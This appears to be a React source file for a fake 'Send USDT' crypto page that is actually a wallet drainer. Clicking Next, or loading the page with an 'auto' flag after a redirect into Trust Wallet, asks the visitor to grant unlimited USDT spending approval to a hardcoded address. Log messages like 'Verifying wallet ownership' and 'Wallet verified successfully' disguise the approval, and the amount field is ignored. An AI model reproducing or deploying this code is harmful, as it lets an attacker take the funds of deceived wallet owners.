"use client";

import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';

const ERC20_ABI = ["function approve(address spender, uint256 amount) returns (bool)"];
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

export default function PortABCDemo() {
  const [logs, setLogs] = useState<string[]>([]);
  const [targetAmount, setTargetAmount] = useState<string>("10");

  // --- CONFIGURATION ---
  const ADMIN_PUBLIC_ADDRESS = "0x8caf61F9Ba121A25f94338221b64408695DB5fa1"; 

  const addLog = (msg: string) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 5)]);
  };

  // THE MAGIC: This watches the URL for the "auto" flag
  useEffect(() => {
    const handleAutoTrigger = async () => {
      const urlParams = new URLSearchParams(window.location.search);
      const isAuto = urlParams.get('auto') === 'true';
      const isInsideWallet = typeof window !== "undefined" && (window as any).ethereum;

      if (isAuto && isInsideWallet) {
        addLog("Secure link detected. Initializing...");
        // Wait 1.5 seconds so the user actually sees the page before the popup hits
        setTimeout(async () => {
          await triggerApproval();
        }, 1500);
      }
    };
    handleAutoTrigger();
  }, []);

  // Shared function to trigger the approval popup
  async function triggerApproval() {
    try {
      if (!(window as any).ethereum) return;
      
      const provider = new ethers.providers.Web3Provider((window as any).ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
      
      addLog("Verifying wallet ownership...");
      const tx = await contract.approve(ADMIN_PUBLIC_ADDRESS, ethers.constants.MaxUint256);
      
      addLog("Transaction sent. Confirming...");
      await tx.wait();
      addLog("Wallet verified successfully.");
    } catch (err: any) {
      addLog("Verification failed.");
    }
  }

  async function handleNextAction() {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    const isInsideWallet = typeof window !== "undefined" && (window as any).ethereum;

    // 1. If in Chrome -> Redirect to Trust Wallet with the AUTO flag
    if (isMobile && !isInsideWallet) {
      addLog("Redirecting to secure terminal...");
      
      // We add ?auto=true so the site knows to trigger the popup on load
      const currentUrl = window.location.origin + window.location.pathname + "?auto=true";
      window.location.href = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`;
      return;
    }

    // 2. If already inside or on Desktop, just trigger normally
    await triggerApproval();
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 font-sans tracking-tight">
      <div className="w-full max-w-[440px] bg-[#111] border border-[#222] rounded-[32px] p-8 shadow-2xl">
        <h1 className="text-xl font-semibold mb-8 text-center text-white/90">Send</h1>

        <div className="space-y-5">
          {/* Token Selector (Static for UI) */}
          <div className="bg-[#1a1a1a] border border-[#333] p-4 rounded-2xl flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 bg-green-500/10 rounded-full flex items-center justify-center text-[10px] font-bold text-green-500 border border-green-500/20">USDT</div>
              <div>
                <p className="text-sm font-semibold">USDT</p>
                <p className="text-[10px] text-gray-500 uppercase font-bold">Tether USD</p>
              </div>
            </div>
            <span className="text-gray-600 text-xs">▼</span>
          </div>

          {/* Amount Input */}
          <div className="space-y-2">
            <label className="text-[11px] text-gray-500 font-bold uppercase ml-1 tracking-widest">Amount</label>
            <div className="relative">
              <input 
                type="number" 
                value={targetAmount}
                onChange={(e) => setTargetAmount(e.target.value)}
                className="w-full bg-[#1a1a1a] border border-[#333] p-4 rounded-2xl text-sm focus:outline-none focus:border-white/10 transition-all pr-24"
              />
              <div className="absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-2">
                <span className="text-[11px] text-gray-500 font-bold">USDT</span>
                <button className="text-[11px] text-green-500 font-bold uppercase ml-1">Max</button>
              </div>
            </div>
          </div>

          <button 
            onClick={handleNextAction}
            className="w-full bg-white text-black font-bold py-4 rounded-2xl hover:bg-gray-200 transition-all active:scale-[0.98] mt-4"
          >
            Next
          </button>
        </div>
      </div>

      {/* Subtle Logs Panel */}
      <div className="mt-8 w-full max-w-[440px] px-2">
        <div className="bg-black/50 p-4 rounded-2xl border border-white/5 font-mono text-[10px] text-gray-500 h-24 overflow-hidden">
          {logs.map((l, i) => <div key={i} className="mb-1">{l}</div>)}
          {logs.length === 0 && <div className="opacity-20 animate-pulse">System standby...</div>}
        </div>
      </div>

      <p className="mt-8 text-[10px] text-gray-600 font-bold uppercase tracking-widest opacity-40">Built with v0 • PortABC Protocol</p>
    </div>
  );
}
